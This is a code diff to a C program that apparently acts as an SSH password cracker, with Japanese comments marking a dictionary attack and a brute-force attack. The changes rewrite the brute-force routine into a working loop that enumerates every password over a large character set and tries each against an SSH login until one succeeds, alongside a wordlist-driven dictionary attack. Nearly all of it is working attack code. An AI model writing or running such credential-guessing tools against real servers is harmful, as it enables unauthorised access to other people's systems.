@@ -13,15 +13,16 @@
 #else
 #define cls "clear" /* If you are not sure, make it a Linux command. */
 #endif
-#define LEN 1024
+#define MAXLEN 1024
 
-inline void logo() {
+//見たとおり。
+void logo() {
     system(cls);
-    puts("           _                           _ ");
-    puts("   ___ ___| |__     ___ _ __ __ _  ___| | _____ _ __");
-    puts("  / __/ __| '_ \\   / __| '__/ _` |/ __| |/ / _ \\ '__|");
-    puts("  \\__ \\__ \\ | | | | (__| | | (_| | (__|   <  __/ |");
-    puts("  |___/___/_| |_|  \\___|_|  \\__,_|\\___|_|\\_\\___|_|");
+    printf("           _                           _ \n\
+   ___ ___| |__     ___ _ __ __ _  ___| | _____ _ __\n\
+  / __/ __| '_ \\   / __| '__/ _` |/ __| |/ / _ \\ '__|\n\
+  \\__ \\__ \\ | | | | (__| | | (_| | (__|   <  __/ |\n\
+  |___/___/_| |_|  \\___|_|  \\__,_|\\___|_|\\_\\___|_|\n");
     puts("");
     printf("          ---==[ creator: ware255 ]==---  \n");
 }
@@ -71,6 +72,7 @@ int show_remote_processes(ssh_session session) {
     return SSH_OK;
 }
 
+//ssh接続
 int ssh_main_connection(char host[], char name[], int port, char password[]) {
     char ip[strlen(host) + 1];
     char user[strlen(name) + 1];
@@ -120,8 +122,8 @@ int ssh_main_connection(char host[], char name[], int port, char password[]) {
 }
 
 //辞書攻撃
-inline void dictionary_attack(char host[], char name[], int *port) {
-    char filename[256], str[LEN];
+void dictionary_attack(char host[], char name[], int *port) {
+    char filename[256], str[MAXLEN] = {0};
     //int i;
     if (port == NULL) {
         printf("Error: port is NULL\n");
@@ -137,7 +139,7 @@ inline void dictionary_attack(char host[], char name[], int *port) {
         exit(1);
     }
     printf("\nAnalyzing %s password...\n", host);
-    while (fgets(str, LEN, fp) != NULL) {
+    while (fgets(str, MAXLEN, fp) != NULL) {
         str[strcspn(str, "\n")] = 0;
         if (ssh_main_connection(host, name, *port, str) == 0) {
             break;
@@ -148,19 +150,24 @@ inline void dictionary_attack(char host[], char name[], int *port) {
 }
 
 //総当たり攻撃
-inline void brute_force_attack(char host[], char name[], int *port) {
-    char c[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz,./\\]:;@[^-+!\"#$%&\'()";
-    char pass[LEN];
-    if (port == NULL) {
-        printf("Error: port is NULL\n");
-        exit(1);
-    }
-    for (unsigned long i = 0;; i++) {
-        pass[i] = c[i];
-        if (ssh_main_connection(host, name, *port, pass) != 0) {
-            exit(1);
+void brute_force_attack(char host[], char name[], int *port) {
+    const char *x = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!\"#$%&\')(-=^~|[{@`]}:*;+_\\/.,>< ";
+    char str[MAXLEN + 1] = {0};
+    int index[MAXLEN + 1] = {0};
+    int i, carry;
+    do {
+        if (ssh_main_connection(host, name, *port, str) == 0) {
+            break;
         }
-    }
+        for(i = 0, index[i]++, carry = !0; carry; i++) {
+            carry = index[i] >= strlen(x);
+            if (carry) {
+                index[i + 1]++;
+                index[i] = 1;
+            }
+            str[i] = x[index[i]];
+        }
+    } while(index[MAXLEN] == 0);
     return;
 }
 
@@ -191,6 +198,7 @@ int main(int argc, char* argv[]) {
     mode = atoi(c_mode);
     switch (mode) {
     case 1:
+        printf("\nAnalyzing %s password...\n", argv[2]);
         brute_force_attack(argv[2], argv[6], &port);
         break;
     case 2:
